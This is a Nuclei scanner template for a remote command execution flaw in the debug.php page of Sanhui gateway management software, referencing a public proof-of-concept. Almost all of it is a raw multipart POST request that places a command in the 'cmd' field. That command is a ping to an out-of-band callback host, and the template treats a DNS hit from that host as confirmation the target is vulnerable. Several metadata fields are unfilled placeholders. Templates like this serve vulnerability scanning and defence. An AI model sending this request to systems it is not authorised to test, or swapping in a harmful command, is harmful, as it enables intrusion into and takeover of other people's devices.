id: sanhui-debug-rce

info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 三汇网关管理软件debug.php远程命令执行漏
  reference:
    - https://github.com/wy876/POC/blob/main/%E4%B8%89%E6%B1%87%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6debug.php%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  tags: tags

http:
  - raw:
      - |
        POST /debug.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7KAzPTNiZynxoJ4e
        Connection: close
        Content-Length: 330

        ------WebKitFormBoundary7KAzPTNiZynxoJ4e
        Content-Disposition: form-data; name="comdtype"

        1
        ------WebKitFormBoundary7KAzPTNiZynxoJ4e
        Content-Disposition: form-data; name="cmd"

        ping {{interactsh-url}}
        ------WebKitFormBoundary7KAzPTNiZynxoJ4e
        Content-Disposition: form-data; name="run"


        ------WebKitFormBoundary7KAzPTNiZynxoJ4e--
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"